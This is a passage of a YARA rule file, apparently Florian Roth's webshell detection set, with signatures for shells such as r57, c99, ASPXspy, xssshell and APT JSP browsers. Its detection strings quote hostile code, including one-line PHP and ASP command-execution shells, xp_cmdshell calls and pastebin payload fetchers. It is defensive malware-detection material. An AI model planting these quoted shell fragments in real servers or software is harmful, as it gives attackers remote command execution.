		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
	condition:
		all of them
}
rule hkdoordll {
	meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b715c009d47686c0e62d0981efce2552"
	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
	condition:
		all of them
}
rule r57shell_2 {
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8023394542cddf8aee5dec6072ed02b5"
	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
	condition:
		all of them
}
rule Mithril_v1_45_dllTest {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
	strings:
		$s3 = "syspath"
		$s4 = "\\Mithril"
		$s5 = "--list the services in the computer"
	condition:
		all of them
}
rule dbgiis6cli {
	meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"
	condition:
		all of them
}
rule remview_2003_04_22 {
	meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
	condition:
		all of them
}
rule FSO_s_test {
	meta:
		description = "Webshells Auto-generated - file test.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "82cf7b48da8286e644f575b039a99c26"
	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";"
		$s2 = "fwrite ($fp, \"$yazi\");"
	condition:
		all of them
}
rule Debug_cress {
	meta:
		description = "Webshells Auto-generated - file cress.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "36a416186fe010574c9be68002a7286a"
	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"
	condition:
		all of them
}
rule webshell {
	meta:
		description = "Webshells Auto-generated - file webshell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f2f8c02921f29368234bfb4d4622ad19"
	strings:
		$s0 = "RhViRYOzz"
		$s1 = "d\\O!jWW"
		$s2 = "bc!jWW"
		$s3 = "0W[&{l"
		$s4 = "[INhQ@\\"
	condition:
		all of them
}
rule FSO_s_EFSO_2 {
	meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
	condition:
		all of them
}
rule thelast_index3 {
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "cceff6dc247aaa25512bad22120a14b4"
	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
	condition:
		all of them
}
rule adjustcr {
	meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_xIShell {
	meta:
		description = "Webshells Auto-generated - file xIShell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "997c8437c0621b4b753a546a53a88674"
	strings:
		$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
	condition:
		all of them
}
rule HYTop_AppPack_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
	condition:
		all of them
}
rule xssshell {
	meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_usr {
	meta:
		description = "Webshells Auto-generated - file usr.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "ade3357520325af50c9098dc8a21a024"
	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
	condition:
		all of them
}
rule FSO_s_phpinj {
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "dd39d17e9baca0363cc1c3664e608929"
	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
	condition:
		all of them
}
rule xssshell_db {
	meta:
		description = "Webshells Auto-generated - file db.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
	condition:
		all of them
}
rule PHP_sh {
	meta:
		description = "Webshells Auto-generated - file sh.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
	condition:
		all of them
}
rule xssshell_default {
	meta:
		description = "Webshells Auto-generated - file default.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
	condition:
		all of them
}
rule EditServer_Webshell_2 {
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"
	condition:
		all of them
}
rule by064cli {
	meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "10e0dff366968b770ae929505d2a9885"
	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"
	condition:
		all of them
}
rule Mithril_dllTest {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"
	strings:
		$s0 = "please enter the password:"
		$s3 = "\\dllTest.pdb"
	condition:
		all of them
}
rule peek_a_boo {
	meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "aca339f60d41fdcba83773be5d646776"
	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"
	condition:
		all of them
}
rule fmlibmalware_raryv3 {
	meta:
		description = "Webshells Auto-generated - file fmlibmalware_raryv3.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "c34c248fed6d5a20d8203924a2088acc"
	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
	condition:
		all of them
}
rule Debug_dllTest_2 {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
	strings:
		$s4 = "\\Debug\\dllTest.pdb"
		$s5 = "--list the services in the computer"
	condition:
		all of them
}
rule connector {
	meta:
		description = "Webshells Auto-generated - file connector.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"
	condition:
		all of them
}
rule shelltools_g0t_root_HideRun {
	meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
	condition:
		all of them
}
rule regshell {
	meta:
		description = "Webshells Auto-generated - file regshell.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "db2fdc821ca6091bab3ebd0d8bc46ded"
	strings:
		$s0 = "Changes the base hive to HKEY_CURRENT_USER."
		$s4 = "Displays a list of values and sub-keys in a registry Hive."
		$s5 = "Enter a menu selection number (1 - 3) or 99 to Exit: "
	condition:
		all of them
}
rule PHP_Shell_v1_7 {
	meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b5978501c7112584532b4ca6fb77cba5"
	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
	condition:
		all of them
}
rule xssshell_save {
	meta:
		description = "Webshells Auto-generated - file save.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "865da1b3974e940936fe38e8e1964980"
	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"
	condition:
		all of them
}
rule screencap {
	meta:
		description = "Webshells Auto-generated - file screencap.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "51139091dea7a9418a50f2712ea72aa6"
	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"
	condition:
		all of them
}
rule FSO_s_phpinj_2 {
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "dd39d17e9baca0363cc1c3664e608929"
	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
	condition:
		all of them
}
rule ZXshell2_0_malware_rar_Folder_zxrecv {
	meta:
		description = "Webshells Auto-generated - file zxrecv.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
	strings:
		$s0 = "RyFlushBuff"
		$s1 = "teToWideChar^FiYP"
		$s2 = "mdesc+8F D"
		$s3 = "\\von76std"
		$s4 = "5pur+virtul"
		$s5 = "- Kablto io"
		$s6 = "ac#f{lowi8a"
	condition:
		all of them
}
rule FSO_s_ajan {
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "22194f8c44524f80254e1b5aec67b03e"
	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"
	condition:
		all of them
}
rule c99shell {
	meta:
		description = "Webshells Auto-generated - file c99shell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
	condition:
		all of them
}
rule phpspy_2005_full {
	meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d1c69bb152645438440e6c903bac16b2"
	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
	condition:
		all of them
}
rule FSO_s_zehir4_2 {
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5b496a61363d304532bcf52ee21f5d55"
	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"
	condition:
		all of them
}
rule httpdoor {
	meta:
		description = "Webshells Auto-generated - file httpdoor.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "6097ea963455a09474471a9864593dc3"
	strings:
		$s4 = "''''''''''''''''''DaJKHPam"
		$s5 = "o,WideCharR]!n]"
		$s6 = "HAutoComplete"
		$s7 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:sch"
	condition:
		all of them
}
rule FSO_s_indexer_2 {
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "135fc50f85228691b401848caef3be9e"
	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
	condition:
		all of them
}
rule HYTop_DevPack_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"
	condition:
		all of them
}
rule _root_040_zip_Folder_deploy {
	meta:
		description = "Webshells Auto-generated - file deploy.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}
rule by063cli {
	meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."
	condition:
		all of them
}
rule icyfox007v1_10_malware_rar_Folder_asp {
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
	condition:
		all of them
}
rule FSO_s_EFSO_2_2 {
	meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
	condition:
		all of them
}
rule byshell063_ntboot_2 {
	meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
	condition:
		all of them
}
rule u_uay {
	meta:
		description = "Webshells Auto-generated - file uay.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
	condition:
		1 of them
}
rule bin_wuaus {
	meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "46a365992bec7377b48a2263c49e4e7d"
	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="
	condition:
		all of them
}
rule pwreveal_webshell {
	meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"
	condition:
		all of them
}
rule shelltools_g0t_root_xwhois {
	meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"
	condition:
		all of them
}
rule vanquish__webshell {
	meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
	strings:
		$s2 = "Vanquish - DLL injection failed:"
	condition:
		all of them
}
rule toj_down_malware_rar_Folder_down {
	meta:
		description = "Webshells Auto-generated - file down.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "db47d7a12b3584a2e340567178886e71"
	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
	condition:
		all of them
}
rule back_door_cmdShell {
	meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"
	condition:
		all of them
}
rule ZXshell2_webshell_malware_rar_Folder_nc {
	meta:
		description = "Webshells Auto-generated - file nc.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"
	condition:
		all of them
}
rule portlessinst {
	meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "74213856fc61475443a91cd84e2a6c2f"
	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"
	condition:
		all of them
}
rule Back_Door {
	meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "41f89e20398368e742eda4a3b45716b6"
	strings:
		$s1 = "\\BDoor\\SetupBDoor"
	condition:
		all of them
}
rule phpshell_webshell_malware {
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
	condition:
		all of them
}
rule BIN_Server_webshell {
	meta:
		description = "Webshells Auto-generated - file Server.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"
	condition:
		all of them
}
rule HYTop2006_malware_backdoor {
	meta:
		description = "Webshells Auto-generated - file 2006.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
	strings:
		$s6 = "strBackDoor = strBackDoor "
	condition:
		all of them
}
rule r57shell_3 {
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
	strings:
		$s1 = "<b>\".$_POST['cmd']"
	condition:
		all of them
}
rule HDConfig {
	meta:
		description = "Webshells Auto-generated - file HDConfig.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "7d60e552fdca57642fd30462416347bd"
	strings:
		$s0 = "An encryption key is derived from the password hash. "
		$s3 = "A hash object has been created. "
		$s4 = "Error during CryptCreateHash!"
		$s5 = "A new key container has been created."
		$s6 = "The password has been added to the hash. "
	condition:
		all of them
}
rule FSO_s_ajan_2 {
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "22194f8c44524f80254e1b5aec67b03e"
	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"
	condition:
		all of them
}

rule Webshell_and_Exploit_CN_APT_HK : Webshell
{
meta:
	author = "Florian Roth"
	description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
	date = "10.10.2014"
	score = 50
strings:
	$a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
	$s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
	$s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
condition:
	$a0 or ( all of ($s*) )
}

rule JSP_Browser_APT_webshell {
	meta:
		description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
		author = "F.Roth"
		date = "10.10.2014"
		score = 60
	strings:
		$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
		$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
		$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
		$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
	condition:
		all of them
}

rule JSP_jfigueiredo_APT_webshell {
	meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "F.Roth"
		date = "12.10.2014"
		score = 60
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
	strings:
		$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
		$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
	condition:
		all of them
}

rule JSP_jfigueiredo_APT_webshell_2 {
	meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "F.Roth"
		date = "12.10.2014"
		score = 60
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
	strings:
		$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
		$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
		$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
		$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
	condition:
		all of ($a*) or all of ($s*)
}

rule AJAX_FileUpload_webshell {
	meta:
		description = "AJAX JS/CSS components providing web shell by APT groups"
		author = "F.Roth"
		date = "12.10.2014"
		score = 75
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/ajaxfileupload.js"
	strings:
		$a1 = "var frameId = 'jUploadFrame' + id;" ascii
		$a2 = "var form = jQuery('<form  action=\"\" method=\"POST\" name=\"' + formId + '\" id=\"' + formId + '\" enctype=\"multipart/form-data\"></form>');" ascii
		$a3 = "jQuery(\"<div>\").html(data).evalScripts();" ascii
	condition:
		all of them
}

rule Webshell_Insomnia {
	meta:
		description = "Insomnia Webshell - file InsomniaShell.aspx"
		author = "Florian Roth"
		reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
		date = "2014/12/09"
		hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"
		score = 80
	strings:
		$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
		$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
		$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
		$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
		$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
		$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
		$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
		$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
	condition:
		3 of them
}


rule SoakSoak_Infected_Wordpress {
	meta:
		description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
		reference = "http://goo.gl/1GzWUX"
		author = "Florian Roth"
		date = "2014/12/15"
		score = 60
	strings:
		$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
		$s1 = "function FuncQueueObject()" ascii fullword
		$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
	condition:
		all of ($s*)
}

rule Pastebin_Webshell {
	meta:
		description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
		author = "Florian Roth"
		score = 70
		date = "13.01.2015"
		reference = "http://goo.gl/7dbyZs"
	strings:
		$s0 = "file_get_contents(\"http://pastebin.com" ascii
		$s1 = "xcurl('http://pastebin.com/download.php" ascii
		$s2 = "xcurl('http://pastebin.com/raw.php" ascii

		$x0 = "if($content){unlink('evex.php');" ascii
		$x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii

		$y0 = "file_put_contents($pth" ascii
		$y1 = "echo \"<login_ok>" ascii
		$y2 = "str_replace('* @package Wordpress',$temp" ascii
	condition:
		1 of ($s*) or all of ($x*) or all of ($y*)
}

rule ASPXspy2 {
	meta:
		description = "Web shell - file ASPXspy2.aspx"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/24"
		hash = "5642387d92139bfe9ae11bfef6bfe0081dcea197"
	strings:
		$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
		$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
		$s3 = "Process[] p=Process.GetProcesses();" fullword ascii
		$s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
		$s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
		$s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
		$s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
		$s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
		$s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
		$s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
		$s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
		$s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
		$s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
		$s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
	condition:
		6 of them
}


/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-11
	Identifier: Web Shell Repo
	Reference: https://github.com/nikicat/web-malware-collection
*/

rule Webshell_27_9_c66_c99 {
	meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash4 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
		hash5 = "6ce99e07aa98ba6dc521c34cf16fbd89654d0ba59194878dffca857a4c34e57b"
		hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash7 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash8 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
